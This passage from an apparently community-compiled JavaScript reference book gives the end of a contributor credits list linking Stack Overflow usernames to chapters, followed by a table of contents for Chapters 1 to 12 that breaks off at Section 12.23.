  Haque](https://stackoverflow.com/users/1878457/)          

  [MEGADEVOPS](https://stackoverflow.com/users/4786134/)    Chapter 1

  [MegaTom](https://stackoverflow.com/users/3990897/)       Chapter 11
  -

  
  [Meow](https://stackoverflow.com/users/5050271/)             Chapters 7, 11, 14, 19, 59 and 62
   
  [metal03326](https://stackoverflow.com/users/4471582/)       Chapters 92 and 99

  [Michal                                                      Chapter 17
  Pietraszko](https://stackoverflow.com/users/6599814/)        

  [Michał                                                      Chapters 1, 35, 38, 43, 76, 77 and 81
  Perłakowski](https://stackoverflow.com/users/3853934/)       

  [Michiel](https://stackoverflow.com/users/2245950/)          Chapter 12

  [Mijago](https://stackoverflow.com/users/3909575/)           Chapter 97

  [Mike C](https://stackoverflow.com/users/371184/)            Chapters 10, 11, 12, 13, 18, 19, 37, 57 and
                                                               65

  [Mike McCaughan](https://stackoverflow.com/users/215552/)    Chapters 3, 8, 9, 12, 13, 15 and 42

  [Mikhail](https://stackoverflow.com/users/5526354/)          Chapters 5, 7, 12, 14, 33, 39, 45, 55 and
                                                               58

  [Mikki](https://stackoverflow.com/users/4236520/)            Chapter 97

  [Mimouni](https://stackoverflow.com/users/2822643/)          Chapters 1 and 12

  [miquelarranz](https://stackoverflow.com/users/2280356/)     Chapter 89

  [Mobiletainment](https://stackoverflow.com/users/1265240/)   Chapter 89

  [Mohamed El](https://stackoverflow.com/users/4517814/)       Chapter 55

  [monikapatel](https://stackoverflow.com/users/4426282/)      Chapter 5

  [Morteza Tourani](https://stackoverflow.com/users/3078890/)  Chapter 12

  [Motocarota](https://stackoverflow.com/users/593963/)        Chapter 42

  [Mottie](https://stackoverflow.com/users/145346/)            Chapters 10, 12, 14 and 18

  [murrayju](https://stackoverflow.com/users/866224/)          Chapter 81

  [n4m31ess_c0d3r](https://stackoverflow.com/users/1726659/)   Chapter 10

  [Nachiketha](https://stackoverflow.com/users/1657018/)       Chapter 63

  [Naeem Shaikh](https://stackoverflow.com/users/3556874/)     Chapters 42 and 69

  [nalply](https://stackoverflow.com/users/220060/)            Chapters 10 and 42

  [Naman Sancheti](https://stackoverflow.com/users/3709792/)   Chapters 1 and 50

  [nasoj1100](https://stackoverflow.com/users/4842671/)        Chapter 12

  [Nathan Tuggy](https://stackoverflow.com/users/4099598/)     Chapter 7

  [naveen](https://stackoverflow.com/users/17447/)             Chapter 65

  [ndugger](https://stackoverflow.com/users/1408759/)          Chapters 17, 19, 22 and 62

  [Neal](https://stackoverflow.com/users/561731/)              Chapters 12, 13, 19, 22, 27, 36 and 62

  [Nelson Teixeira](https://stackoverflow.com/users/2752520/)  Chapter 12

  [nem035](https://stackoverflow.com/users/3928341/)           Chapters 10, 12, 20, 60 and 65

  [nhahtdh](https://stackoverflow.com/users/1400768/)          Chapter 31

  [Nhan](https://stackoverflow.com/users/2571493/)             Chapters 12 and 35

  [ni8mr](https://stackoverflow.com/users/3458727/)            Chapters 10 and 18

  [nicael](https://stackoverflow.com/users/2963652/)           Chapters 11, 42, 44 and 99

  [Nicholas Montaño](https://stackoverflow.com/users/4883095/) Chapter 102

  [Nick](https://stackoverflow.com/users/2639721/)             Chapter 1

  [Nick Larsen](https://stackoverflow.com/users/178082/)       Chapter 61

  [NickHTTPS](https://stackoverflow.com/users/1167472/)        Chapter 63

  [Nikita Kurtin](https://stackoverflow.com/users/3219049/)    Chapters 99 and 104

  [Nikola Lukic](https://stackoverflow.com/users/1513187/)     Chapters 58 and 101

  [Nina Scholz](https://stackoverflow.com/users/1447675/)      Chapters 12 and 40

  [Nisarg](https://stackoverflow.com/users/5894241/)           Chapter 66

  [npdoty](https://stackoverflow.com/users/108575/)            Chapter 71

  [nseepana](https://stackoverflow.com/users/6709129/)         Chapter 104

  [Nuri Tasdemir](https://stackoverflow.com/users/1519458/)    Chapters 42 and 62

  [nus](https://stackoverflow.com/users/1115652/)              Chapter 19

  [nylki](https://stackoverflow.com/users/2921415/)            Chapter 1

  [Oriol](https://stackoverflow.com/users/1529630/)            Chapter 10

  [Ortomala Lokni](https://stackoverflow.com/users/1807667/)   Chapter 10

  [orvi](https://stackoverflow.com/users/3654356/)             Chapters 1 and 18

  [Oscar Jara](https://stackoverflow.com/users/1178686/)       Chapter 10

  [Ovidiu Dolha](https://stackoverflow.com/users/5379496/)     Chapter 93
  

[Ozan](https://stackoverflow.com/users/4180481/) Chapter 75

[oztune](https://stackoverflow.com/users/906311/) Chapters 5, 18, 55 and
57

[P.J.Meisch](https://stackoverflow.com/users/4393565/) Chapter 62
[PageYe](https://stackoverflow.com/users/6488128/) Chapter 10
>
[Pankaj Upadhyay](https://stackoverflow.com/users/405630/) Chapter 62
[Parvez Rahaman](https://stackoverflow.com/users/3324481/) Chapters 30
and 72

[patrick96](https://stackoverflow.com/users/5363071/) Chapter 42

[Paul S.](https://stackoverflow.com/users/1615483/) Chapters 7, 10, 19,
27, 31 and 62

[Pawel Dubiel](https://stackoverflow.com/users/706466/) Chapters 17
and 59 [PedroSouki](https://stackoverflow.com/users/4166211/) Chapters
23 and 65

[pensan](https://stackoverflow.com/users/1162597/) Chapter 14

[Peter Bielak](https://stackoverflow.com/users/2051835/) Chapter 94

[Peter G](https://stackoverflow.com/users/4504895/) Chapter 5

[Peter LaBanca](https://stackoverflow.com/users/7513380/) Chapter 1

[Peter Olson](https://stackoverflow.com/users/546661/) Chapter 13
[Peter Seliger](https://stackoverflow.com/users/2627243/) Chapter 22
[phaistonian](https://stackoverflow.com/users/422839/) Chapter 12
>
[Phil](https://stackoverflow.com/users/6429774/) Chapter 13
[pietrovismara](https://stackoverflow.com/users/3142367/) Chapter 89
[Pinal](https://stackoverflow.com/users/2525067/) Chapters 19, 42 and
55 [pinjasaur](https://stackoverflow.com/users/6357231/) Chapter 4
[PitaJ](https://stackoverflow.com/users/847382/) Chapter 65
>
[Pranav C Balan](https://stackoverflow.com/users/3037257/) Chapter 12
[programmer5000](https://stackoverflow.com/users/6560716/) Chapter 95
[ProllyGeek](https://stackoverflow.com/users/3025259/) Chapters 20, 65
and 79 [pzp](https://stackoverflow.com/users/3155933/) Chapters 8, 30
and 71

[Qianyue](https://stackoverflow.com/users/1165178/) Chapters 12, 60 and
62

[QoP](https://stackoverflow.com/users/4484822/) Chapters 12, 19, 22, 35,
42 and 57

[Quartz Fog](https://stackoverflow.com/users/6513795/) Chapters 31 and
54

[Quill](https://stackoverflow.com/users/3296811/) Chapters 7 and 42

[Racil Hilan](https://stackoverflow.com/users/3215948/) Chapter 34
[Rafael Dantas](https://stackoverflow.com/users/3504913/) Chapter 12

[Rahul Arora](https://stackoverflow.com/users/5433342/) Chapters 20 and
29

[Rajaprabhu Aravindasamy](https://stackoverflow.com/users/1209018/)
Chapter 13

[Rajesh](https://stackoverflow.com/users/3783478/) Chapter 10

[Rakitić](https://stackoverflow.com/users/6290553/) Chapter 1

[RamenChef](https://stackoverflow.com/users/6392939/) Chapter 14

[Randy](https://stackoverflow.com/users/1691311/) Chapters 19 and 50

[Raphael Schweikert](https://stackoverflow.com/users/11940/) Chapter
10 [rfsbsb](https://stackoverflow.com/users/1949694/) Chapter 67
[richard](https://stackoverflow.com/users/2958281/) Chapter 37

[Richard Hamilton](https://stackoverflow.com/users/4703663/) Chapters 7,
10, 12, 14, 31, 48 and 99

[Richard Turner](https://stackoverflow.com/users/12559/) Chapter 62
[riyaz](https://stackoverflow.com/users/6611700/) Chapter 42
[Roamer](https://stackoverflow.com/users/3478010/) Chapter 42

[Rohit Jindal](https://stackoverflow.com/users/4116300/) Chapters 30 and
40

[Rohit Kumar](https://stackoverflow.com/users/6076713/) Chapter 57

[Rohit Shelhalkar](https://stackoverflow.com/users/4396403/) Chapter 5

[Roko C. Buljan](https://stackoverflow.com/users/383904/) Chapters 4, 7,
12, 14, 33, 44, 45, 89 and 106

[rolando](https://stackoverflow.com/users/3384695/) Chapters 12, 13, 18
and 19

[rolfedh](https://stackoverflow.com/users/3005258/) Chapter 19

[Ronen Ness](https://stackoverflow.com/users/1134649/) Chapters 12, 19,
32 and 43

[ronnyfm](https://stackoverflow.com/users/204968/) Chapter 1

  
  [royhowie](https://stackoverflow.com/users/2476755/)           Chapter 35
   
  [Ruhul Amin](https://stackoverflow.com/users/1960558/)         Chapter 41

  [rvighne](https://stackoverflow.com/users/1079573/)            Chapters 13, 19, 22, 45 and 88

  [Ry](https://stackoverflow.com/users/707111/)                  Chapter 31

  [S Willis](https://stackoverflow.com/users/5795554/)           Chapter 8

  [sabithpocker](https://stackoverflow.com/users/427146/)        Chapter 7

  [Sagar V](https://stackoverflow.com/users/2427065/)            Chapters 19, 29 and 61

  [Sammy I.](https://stackoverflow.com/users/3413536/)           Chapter 20

  [Sandro](https://stackoverflow.com/users/107797/)              Chapter 12

  [SarathChandra](https://stackoverflow.com/users/2869791/)      Chapter 11

  [Saroj Sasmal](https://stackoverflow.com/users/5293076/)       Chapter 1

  [Scimonster](https://stackoverflow.com/users/3187556/)         Chapter 24

  [Sean Vieira](https://stackoverflow.com/users/135978/)         Chapter 27

  [SeanKendle](https://stackoverflow.com/users/1410567/)         Chapter 1

  [SeinopSys](https://stackoverflow.com/users/1344955/)          Chapters 1 and 96

  [SEUH](https://stackoverflow.com/users/2517393/)               Chapter 61

  [SgtPooki](https://stackoverflow.com/users/592760/)            Chapter 97

  [shaedrich](https://stackoverflow.com/users/7451109/)          Chapter 70

  [shaN](https://stackoverflow.com/users/4221558/)               Chapter 90

  [Shawn](https://stackoverflow.com/users/430213/)               Chapter 60

  [Shog9](https://stackoverflow.com/users/811/)                  Chapters 19 and 59

  [Shrey Gupta](https://stackoverflow.com/users/1543403/)        Chapter 12

  [Sibeesh Venu](https://stackoverflow.com/users/5550507/)       Chapter 56

  [sielakos](https://stackoverflow.com/users/6356166/)           Chapters 12, 19 and 50

  [Siguza](https://stackoverflow.com/users/2302862/)             Chapter 40

  [simonv](https://stackoverflow.com/users/6546775/)             Chapter 29

  [SirPython](https://stackoverflow.com/users/3424096/)          Chapter 5

  [smallmushroom](https://stackoverflow.com/users/7166588/)      Chapter 18

  [Spencer Wieczorek](https://stackoverflow.com/users/3149020/)  Chapters 7, 10, 15 and 65

  [spirit](https://stackoverflow.com/users/6245875/)             Chapter 35

  [splay](https://stackoverflow.com/users/1392998/)              Chapters 7, 10 and 40

  [Sreekanth](https://stackoverflow.com/users/6794233/)          Chapter 89

  [ssc](https://stackoverflow.com/users/3233827/)                Chapter 1

  [stackoverfloweth](https://stackoverflow.com/users/3511012/)   Chapter 13

  [Stephen Leppik](https://stackoverflow.com/users/6388243/)     Chapter 40

  [Steve Greatrex](https://stackoverflow.com/users/261782/)      Chapter 42

  [Stewartside](https://stackoverflow.com/users/2889988/)        Chapter 14

  [Stides](https://stackoverflow.com/users/3940327/)             Chapter 60

  [still_learning](https://stackoverflow.com/users/2948765/)     Chapters 14 and 94

  [styfle](https://stackoverflow.com/users/266535/)              Chapter 20

  [sudo bangbang](https://stackoverflow.com/users/3951782/)      Chapter 42

  [Sumit](https://stackoverflow.com/users/2741678/)              Chapter 11

  [Sumner Evans](https://stackoverflow.com/users/2319844/)       Chapters 99 and 102

  [Sumurai8](https://stackoverflow.com/users/2209007/)           Chapters 8, 10, 13, 14, 17, 35 and 56

  [Sunny R Gupta](https://stackoverflow.com/users/1477051/)      Chapter 56

  [svarog](https://stackoverflow.com/users/1410465/)             Chapters 7, 17, 43, 80 and 90

  [Sverri M. Olsen](https://stackoverflow.com/users/1300892/)    Chapter 1

  [SZenC](https://stackoverflow.com/users/3315779/)              Chapters 1, 10, 11, 13, 14, 18, 19, 30, 31, 32,
                                                                 36, 59, 62, 80 and 97

  [Tacticus](https://stackoverflow.com/users/3362188/)           Chapter 96

  [tandrewnichols](https://stackoverflow.com/users/1437845/)     Chapter 19

  [Tanmay Nehete](https://stackoverflow.com/users/2608080/)      Chapter 19

  [Taras Lukavyi](https://stackoverflow.com/users/900982/)       Chapter 59

  [tcooc](https://stackoverflow.com/users/368772/)               Chapter 42
  

  -
  [teppic](https://stackoverflow.com/users/3591528/)              Chapter 42
   
  [Thomas Leduc](https://stackoverflow.com/users/1204267/)        Chapter 31

  [Thriggle](https://stackoverflow.com/users/2701677/)            Chapters 1 and 19

  [Ties](https://stackoverflow.com/users/5171528/)                Chapter 74

  [tiffon](https://stackoverflow.com/users/1888292/)              Chapter 101

  [Tim](https://stackoverflow.com/users/4714902/)                 Chapter 30

  [Tim Rijavec](https://stackoverflow.com/users/2365792/)         Chapter 86

  [Tiny Giant](https://stackoverflow.com/users/4639281/)          Chapter 36

  [tjfwalker](https://stackoverflow.com/users/2180523/)           Chapter 11

  [tnga](https://stackoverflow.com/users/5221347/)                Chapter 1

  [Tolen](https://stackoverflow.com/users/5593085/)               Chapter 1

  [Tomás Cañibano](https://stackoverflow.com/users/5384592/)      Chapters 7 and 59

  [Tomboyo](https://stackoverflow.com/users/4816074/)             Chapter 17

  [tomturton](https://stackoverflow.com/users/1485351/)           Chapter 65

  [ton](https://stackoverflow.com/users/2397613/)                 Chapter 56

  [Tot Zam](https://stackoverflow.com/users/4660897/)             Chapter 36

  [towerofnix](https://stackoverflow.com/users/4633828/)          Chapter 38

  [transistor09](https://stackoverflow.com/users/420597/)         Chapter 33

  [Traveling Tech Guy](https://stackoverflow.com/users/19856/)    Chapter 12

  [Travis Acton](https://stackoverflow.com/users/7675833/)        Chapter 1

  [Trevor Clarke](https://stackoverflow.com/users/3998484/)       Chapters 8, 14 and 46

  [trincot](https://stackoverflow.com/users/5459839/)             Chapters 19 and 35

  [Tschallacka](https://stackoverflow.com/users/1356107/)         Chapter 65

  [Tushar](https://stackoverflow.com/users/2025923/)              Chapters 1 and 31

  [user2314737](https://stackoverflow.com/users/2314737/)         Chapters 8, 12, 14, 19, 35, 50, 59 and 104

  [user3882768](https://stackoverflow.com/users/3882768/)         Chapter 11

  [Vaclav](https://stackoverflow.com/users/2508019/)              Chapter 12

  [VahagnNikoghosian](https://stackoverflow.com/users/1696972/)   Chapters 12 and 104

  [Vasiliy Levykin](https://stackoverflow.com/users/2582880/)     Chapters 3, 10 and 19

  [Ven](https://stackoverflow.com/users/1737909/)                 Chapters 1, 10 and 42

  [Victor Bjelkholm](https://stackoverflow.com/users/360186/)     Chapter 5

  [VisioN](https://stackoverflow.com/users/1249581/)              Chapters 12 and 52

  [Vlad Nicula](https://stackoverflow.com/users/665791/)          Chapter 62

  [Vladimir Gabrielyan](https://stackoverflow.com/users/4983595/) Chapter 42

  [wackozacko](https://stackoverflow.com/users/934420/)           Chapters 42 and 60

  [WebBrother](https://stackoverflow.com/users/2179748/)          Chapter 65

  [whales](https://stackoverflow.com/users/5285528/)              Chapters 8 and 18

  [Will](https://stackoverflow.com/users/145279/)                 Chapter 62

  [Wladimir Palant](https://stackoverflow.com/users/785541/)      Chapters 5, 10, 42 and 62

  [Wolfgang](https://stackoverflow.com/users/1979340/)            Chapter 30

  [wuxiandiejia](https://stackoverflow.com/users/4675056/)        Chapters 7, 12 and 43

  [XavCo7](https://stackoverflow.com/users/5522551/)              Chapters 1, 11, 12, 13, 18, 40, 50, 63, 64, 71,
                                                                  90 and 92

  [xims](https://stackoverflow.com/users/1539384/)                Chapter 1

  [YakovL](https://stackoverflow.com/users/3995261/)              Chapter 56

  [ymz](https://stackoverflow.com/users/4062197/)                 Chapter 19

  [Yosvel Quintero](https://stackoverflow.com/users/1932552/)     Chapters 1, 5, 12, 13, 14, 17, 22, 34, 35, 42
                                                                  and 104

  [Yumiko](https://stackoverflow.com/users/4168649/)              Chapter 33

  [Yury Fedorov](https://stackoverflow.com/users/4378400/)        Chapters 1 and 42

  [Zack Harley](https://stackoverflow.com/users/4785610/)         Chapter 56

  [Zaga](https://stackoverflow.com/users/6633643/)                Chapter 31

  [Zaz](https://stackoverflow.com/users/405550/)                  Chapter 42

  [zb&apos;](https://stackoverflow.com/users/815386/)                 Chapter 42

  [zer00ne](https://stackoverflow.com/users/2813224/)             Chapter 12
  -

  -
  [ZeroBased_IX](https://stackoverflow.com/users/1888402/)    Chapter 12
   -
  [Zhegan](https://stackoverflow.com/users/616717/)           Chapter 35

  [zhirzh](https://stackoverflow.com/users/1343488/)          Chapters 12, 14 and 19

  [Zirak](https://stackoverflow.com/users/617762/)            Chapter 56

  [Zoltan.Tamasi](https://stackoverflow.com/users/2081056/)   Chapter 42

  [zur4ik](https://stackoverflow.com/users/516245/)           Chapters 19 and 62

  [zurfyx](https://stackoverflow.com/users/2013580/)          Chapter 70

  [Zze](https://stackoverflow.com/users/3509591/)             Chapter 1
  

# You may also like

<!--last updated 8/22/24 Thu 2:22pm-->
<!--moved table of contents to here-->
[<b>About** [1](#about)](#about)

[**Chapter 1: Getting started with JavaScript** [2](#section)](#section)

[Section 1.1: Using console.log()
[2](#section-1.1-using-console.log)](#section-1.1-using-console.log)

[Section 1.2: Using the DOM API
[4](#section-1.2-using-the-dom-api)](#section-1.2-using-the-dom-api)

[Section 1.3: Using window.alert()
[5](#section-1.3-using-window.alert)](#section-1.3-using-window.alert)

[Section 1.4: Using window.prompt()
[6](#section-1.4-using-window.prompt)](#section-1.4-using-window.prompt)

[Section 1.5: Using window.confirm()
[7](#section-1.5-using-window.confirm)](#section-1.5-using-window.confirm)

[Section 1.6: Using the DOM API (with graphical text: Canvas, SVG, or
image file)
[8](#section-1.6-using-the-dom-api-with-graphical-text-canvas-svg-or-image-file)](#section-1.6-using-the-dom-api-with-graphical-text-canvas-svg-or-image-file)

[**Chapter 2: JavaScript Variables**
[10](#chapter-2-javascript-variables)](#chapter-2-javascript-variables)

[Section 2.1: Defining a Variable
[10](#section-2.1-defining-a-variable)](#section-2.1-defining-a-variable)

[Section 2.2: Using a Variable
[10](#section-2.2-using-a-variable)](#section-2.2-using-a-variable)

[Section 2.3: Types of Variables
[10](#section-2.3-types-of-variables)](#section-2.3-types-of-variables)

[Section 2.4: Arrays and Objects
[11](#section-2.4-arrays-and-objects)](#section-2.4-arrays-and-objects)

[**Chapter 3: Built-in Constants**
[12](#chapter-3-built-in-constants)](#chapter-3-built-in-constants)

[Section 3.1: null [12](#section-3.1-null)](#section-3.1-null)

[Section 3.2: Testing for NaN using isNaN()
[12](#section-3.2-testing-for-nan-using-isnan)](#section-3.2-testing-for-nan-using-isnan)

[Section 3.3: NaN [13](#section-3.3-nan)](#section-3.3-nan)

[Section 3.4: undefined and null
[14](#section-3.4-undefined-and-null)](#section-3.4-undefined-and-null)

[Section 3.5: Infinity and -Infinity
[15](#section-3.5-infinity-andinfinity)](#section-3.5-infinity-andinfinity)

[Section 3.6: Number constants
[15](#section-3.6-number-constants)](#section-3.6-number-constants)

[Section 3.7: Operations that return NaN
[16](#section-3.7-operations-that-return-nan)](#section-3.7-operations-that-return-nan)

[Section 3.8: Math library functions that return NaN
[16](#section-3.8-math-library-functions-that-return-nan)](#section-3.8-math-library-functions-that-return-nan)

[**Chapter 4: Comments** [17](#chapter-4-comments)](#chapter-4-comments)

[Section 4.1: Using Comments
[17](#section-4.1-using-comments)](#section-4.1-using-comments)

[Section 4.2: Using HTML comments in JavaScript (Bad practice)
[17](#section-4.2-using-html-comments-in-javascript-bad-practice)](#section-4.2-using-html-comments-in-javascript-bad-practice)

[**Chapter 5: Console** [19](#chapter-5-console)](#chapter-5-console)

[Section 5.1: Measuring time - console.time()
[22](#section-5.1-measuring-timeconsole.time)](#section-5.1-measuring-timeconsole.time)

[Section 5.2: Formatting console output
[23](#section-5.2-formatting-console-output)](#section-5.2-formatting-console-output)

[Section 5.3: Printing to a browser&apos;s debugging console
[24](#section-5.3-printing-to-a-browsers-debugging-console)](#section-5.3-printing-to-a-browsers-debugging-console)

[Section 5.4: Including a stack trace when logging - console.trace()
[26](#section-5.4-including-a-stack-trace-when-logging-console.trace)](#section-5.4-including-a-stack-trace-when-logging-console.trace)

[Section 5.5: Tabulating values - console.table()
[26](#section-5.5-tabulating-valuesconsole.table)](#section-5.5-tabulating-valuesconsole.table)

[Section 5.6: Counting - console.count()
[28](#section-5.6-countingconsole.count)](#section-5.6-countingconsole.count)

[Section 5.7: Clearing the console - console.clear()
[30](#section-5.7-clearing-the-consoleconsole.clear)](#section-5.7-clearing-the-consoleconsole.clear)

[Section 5.8: Displaying objects and XML interactively - console.dir(),
console.dirxml()
[30](#section-5.8-displaying-objects-and-xml-interactively-console.dir-console.dirxml)](#section-5.8-displaying-objects-and-xml-interactively-console.dir-console.dirxml)

[Section 5.9: Debugging with assertions - console.assert()
[32](#section-5.9-debugging-with-assertionsconsole.assert)](#section-5.9-debugging-with-assertionsconsole.assert)

[**Chapter 6: Datatypes in JavaScript**
[33](#chapter-6-datatypes-in-javascript)](#chapter-6-datatypes-in-javascript)

[Section 6.1: typeof [33](#section-6.1-typeof)](#section-6.1-typeof)

[Section 6.2: Finding an object&apos;s class
[34](#section-6.2-finding-an-objects-class)](#section-6.2-finding-an-objects-class)

[Section 6.3: Getting object type by constructor name
[34](#section-6.3-getting-object-type-by-constructor-name)](#section-6.3-getting-object-type-by-constructor-name)

[**Chapter 7: Strings** [37](#chapter-7-strings)](#chapter-7-strings)

[Section 7.1: Basic Info and String Concatenation
[37](#section-7.1-basic-info-and-string-concatenation)](#section-7.1-basic-info-and-string-concatenation)

[Section 7.2: Reverse String
[38](#section-7.2-reverse-string)](#section-7.2-reverse-string)

[Section 7.3: Comparing Strings Lexicographically
[39](#section-7.3-comparing-strings-lexicographically)](#section-7.3-comparing-strings-lexicographically)

[Section 7.4: Access character at index in string
[40](#section-7.4-access-character-at-index-in-string)](#section-7.4-access-character-at-index-in-string)

[Section 7.5: Escaping quotes
[40](#section-7.5-escaping-quotes)](#section-7.5-escaping-quotes)

[Section 7.6: Word Counter
[41](#section-7.6-word-counter)](#section-7.6-word-counter)

[Section 7.7: Trim whitespace
[41](#section-7.7-trim-whitespace)](#section-7.7-trim-whitespace)

[Section 7.8: Splitting a string into an array
[41](#section-7.8-splitting-a-string-into-an-array)](#section-7.8-splitting-a-string-into-an-array)

[Section 7.9: Strings are unicode
[42](#section-7.9-strings-are-unicode)](#section-7.9-strings-are-unicode)

[Section 7.10: Detecting a string
[42](#section-7.10-detecting-a-string)](#section-7.10-detecting-a-string)

[Section 7.11: Substrings with slice
[43](#section-7.11-substrings-with-slice)](#section-7.11-substrings-with-slice)

[Section 7.12: Character code
[43](#section-7.12-character-code)](#section-7.12-character-code)

[Section 7.13: String Representations of Numbers
[43](#section-7.13-string-representations-of-numbers)](#section-7.13-string-representations-of-numbers)

[Section 7.14: String Find and Replace Functions
[44](#section-7.14-string-find-and-replace-functions)](#section-7.14-string-find-and-replace-functions)

[Section 7.15: Find the index of a substring inside a string
[45](#section-7.15-find-the-index-of-a-substring-inside-a-string)](#section-7.15-find-the-index-of-a-substring-inside-a-string)

[Section 7.16: String to Upper Case
[45](#section-7.16-string-to-upper-case)](#section-7.16-string-to-upper-case)

[Section 7.17: String to Lower Case
[46](#section-7.17-string-to-lower-case)](#section-7.17-string-to-lower-case)

[Section 7.18: Repeat a String
[46](#section-7.18-repeat-a-string)](#section-7.18-repeat-a-string)

[**Chapter 8: Date** [47](#chapter-8-date)](#chapter-8-date)

[Section 8.1: Create a new Date object
[47](#section-8.1-create-a-new-date-object)](#section-8.1-create-a-new-date-object)

[Section 8.2: Convert to a string format
[49](#section-8.2-convert-to-a-string-format)](#section-8.2-convert-to-a-string-format)

[Section 8.3: Creating a Date from UTC
[50](#section-8.3-creating-a-date-from-utc)](#section-8.3-creating-a-date-from-utc)

[Section 8.4: Formatting a JavaScript date
[53](#section-8.4-formatting-a-javascript-date)](#section-8.4-formatting-a-javascript-date)

[Section 8.5: Get the number of milliseconds elapsed since 1 January
1970 00:00:00 UTC
[55](#section-8.5-get-the-number-of-milliseconds-elapsed-since-1-january-1970-000000-utc)](#section-8.5-get-the-number-of-milliseconds-elapsed-since-1-january-1970-000000-utc)

[Section 8.6: Get the current time and date
[55](#section-8.6-get-the-current-time-and-date)](#section-8.6-get-the-current-time-and-date)

[Section 8.7: Increment a Date Object
[56](#section-8.7-increment-a-date-object)](#section-8.7-increment-a-date-object)

[Section 8.8: Convert to JSON
[57](#section-8.8-convert-to-json)](#section-8.8-convert-to-json)

[**Chapter 9: Date Comparison**
[58](#chapter-9-date-comparison)](#chapter-9-date-comparison)

[Section 9.1: Comparing Date values
[58](#section-9.1-comparing-date-values)](#section-9.1-comparing-date-values)

[Section 9.2: Date Dierence Calculation
[59](#section-9.2-date-dierence-calculation)](#section-9.2-date-dierence-calculation)

[**Chapter 10: Comparison Operations**
[60](#chapter-10-comparison-operations)](#chapter-10-comparison-operations)

[Section 10.1: Abstract equality / inequality and type conversion
[60](#section-10.1-abstract-equality-inequality-and-type-conversion)](#section-10.1-abstract-equality-inequality-and-type-conversion)

[Section 10.2: NaN Property of the Global Object
[61](#section-10.2-nan-property-of-the-global-object)](#section-10.2-nan-property-of-the-global-object)

[Section 10.3: Short-circuiting in boolean operators
[63](#section-10.3-short-circuiting-in-boolean-operators)](#section-10.3-short-circuiting-in-boolean-operators)

[Section 10.4: Null and Undefined
[65](#section-10.4-null-and-undefined)](#section-10.4-null-and-undefined)

[Section 10.5: Abstract Equality (==)
[65](#section-10.5-abstract-equality)](#section-10.5-abstract-equality)

[Section 10.6: Logic Operators with Booleans
[66](#section-10.6-logic-operators-with-booleans)](#section-10.6-logic-operators-with-booleans)

[Section 10.7: Automatic Type Conversions
[67](#section-10.7-automatic-type-conversions)](#section-10.7-automatic-type-conversions)

[Section 10.8: Logic Operators with Non-boolean values (boolean
coercion)
[67](#section-10.8-logic-operators-with-non-boolean-values-boolean-coercion)](#section-10.8-logic-operators-with-non-boolean-values-boolean-coercion)

[Section 10.9: Empty Array
[68](#section-10.9-empty-array)](#section-10.9-empty-array)

[Section 10.10: Equality comparison operations
[68](#section-10.10-equality-comparison-operations)](#section-10.10-equality-comparison-operations)

[Section 10.11: Relational operators (&lt;, &lt;=, &gt;, &gt;=)
[70](#section-10.11-relational-operators)](#section-10.11-relational-operators)

[Section 10.12: Inequality
[71](#section-10.12-inequality)](#section-10.12-inequality)

[Section 10.13: List of Comparison Operators
[72](#section-10.13-list-of-comparison-operators)](#section-10.13-list-of-comparison-operators)

[Section 10.14: Grouping multiple logic statements
[72](#section-10.14-grouping-multiple-logic-statements)](#section-10.14-grouping-multiple-logic-statements)

[Section 10.15: Bit fields to optimise comparison of multi state data
[72](#section-10.15-bit-fields-to-optimise-comparison-of-multi-state-data)](#section-10.15-bit-fields-to-optimise-comparison-of-multi-state-data)

[**Chapter 11: Conditions**
[74](#chapter-11-conditions)](#chapter-11-conditions)

[Section 11.1: Ternary operators
[74](#section-11.1-ternary-operators)](#section-11.1-ternary-operators)

[Section 11.2: Switch statement
[75](#section-11.2-switch-statement)](#section-11.2-switch-statement)

[Section 11.3: If / Else If / Else Control
[77](#section-11.3-if-else-if-else-control)](#section-11.3-if-else-if-else-control)

[Section 11.4: Strategy
[78](#section-11.4-strategy)](#section-11.4-strategy)

[Section 11.5: Using &vert;&vert; and && short circuiting
[79](#section-11.5-using-and-short-circuiting)](#section-11.5-using-and-short-circuiting)

[**Chapter 12: Arrays** [80](#chapter-12-arrays)](#chapter-12-arrays)

[Section 12.1: Converting Array-like Objects to Arrays
[80](#section-12.1-converting-array-like-objects-to-arrays)](#section-12.1-converting-array-like-objects-to-arrays)

[Section 12.2: Reducing values
[82](#section-12.2-reducing-values)](#section-12.2-reducing-values)

[Section 12.3: Mapping values
[84](#section-12.3-mapping-values)](#section-12.3-mapping-values)

[Section 12.4: Filtering Object Arrays
[84](#section-12.4-filtering-object-arrays)](#section-12.4-filtering-object-arrays)

[Section 12.5: Sorting Arrays
[86](#section-12.5-sorting-arrays)](#section-12.5-sorting-arrays)

[Section 12.6: Iteration
[88](#section-12.6-iteration)](#section-12.6-iteration)

[Section 12.7: Destructuring an array
[92](#section-12.7-destructuring-an-array)](#section-12.7-destructuring-an-array)

[Section 12.8: Removing duplicate elements
[93](#section-12.8-removing-duplicate-elements)](#section-12.8-removing-duplicate-elements)

[Section 12.9: Array comparison
[93](#section-12.9-array-comparison)](#section-12.9-array-comparison)

[Section 12.10: Reversing arrays
[94](#section-12.10-reversing-arrays)](#section-12.10-reversing-arrays)

[Section 12.11: Shallow cloning an array
[95](#section-12.11-shallow-cloning-an-array)](#section-12.11-shallow-cloning-an-array)

[Section 12.12: Concatenating Arrays
[95](#section-12.12-concatenating-arrays)](#section-12.12-concatenating-arrays)

[Section 12.13: Merge two array as key value pair
[97](#section-12.13-merge-two-array-as-key-value-pair)](#section-12.13-merge-two-array-as-key-value-pair)

[Section 12.14: Array spread / rest
[97](#section-12.14-array-spread-rest)](#section-12.14-array-spread-rest)

[Section 12.15: Filtering values
[98](#section-12.15-filtering-values)](#section-12.15-filtering-values)

[Section 12.16: Searching an Array
[99](#section-12.16-searching-an-array)](#section-12.16-searching-an-array)

[Section 12.17: Convert a String to an Array
[100](#section-12.17-convert-a-string-to-an-array)](#section-12.17-convert-a-string-to-an-array)

[Section 12.18: Removing items from an array
[100](#section-12.18-removing-items-from-an-array)](#section-12.18-removing-items-from-an-array)

[Section 12.19: Removing all elements
[101](#section-12.19-removing-all-elements)](#section-12.19-removing-all-elements)

[Section 12.20: Finding the minimum or maximum element
[102](#section-12.20-finding-the-minimum-or-maximum-element)](#section-12.20-finding-the-minimum-or-maximum-element)

[Section 12.21: Standard array initialization
[103](#section-12.21-standard-array-initialization)](#section-12.21-standard-array-initialization)

[Section 12.22: Joining array elements in a string
[104](#section-12.22-joining-array-elements-in-a-string)](#section-12.22-joining-array-elements-in-a-string)

[Section 12.23: Removing/Adding elements using splice()
